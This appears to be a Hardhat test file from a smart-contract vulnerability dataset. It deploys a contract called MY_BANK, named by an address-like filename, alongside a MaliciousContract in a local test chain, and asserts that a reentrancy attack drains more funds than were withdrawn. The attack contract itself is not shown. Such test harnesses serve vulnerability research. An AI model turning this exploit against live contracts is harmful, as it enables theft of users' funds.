const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for 0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol", function () {
  let MY_BANK;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    const logPath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol/Log.json');
    const logJson = JSON.parse(fs.readFileSync(logPath));
    Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy MY_BANK contract with Log address
    const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol/MY_BANK.json');
    const json = JSON.parse(fs.readFileSync(codePath));
    MY_BANK = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await MY_BANK.deploy(log.target);
    await victim.waitForDeployment();
 
    // Deploy MaliciousContract with MY_BANK address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0xf015c35649c82f5467c9c74b7f28ee67665aad68_attack.sol:MaliciousContract");
    hacker = await MaliciousContract.deploy(victim.target);
    
  });

  it('sanity check: reentrancy/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol', async function () {
    await expect(victim.Put(0, { value: 0 })).to.not.be.reverted;
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Put( 0, {value: ethers.parseEther("3") });

    const victimInitialBalance = await ethers.provider.getBalance(victim.target);
    expect(victimInitialBalance).to.equal(ethers.parseEther("3")); 


    // Initial deposit from maliciousContract on victim contract
    await hacker.deposit({value:  ethers.parseEther("5")});

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("8")); 

    //set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [
        hacker.target,
        "0x0",
      ]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack( ethers.parseEther("3"));

    
    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    const maliciousContractBalance = await ethers.provider.getBalance(hacker.target);

    // Verify the attack was successful
    
    // victim has lost more funds than the withdrawal
    expect(victimBalance).to.be.below(ethers.parseEther("5")); 

    // hacker has more than the withdrawal 
    expect(maliciousContractBalance).to.be.above(ethers.parseEther("3"));
    
  });
});
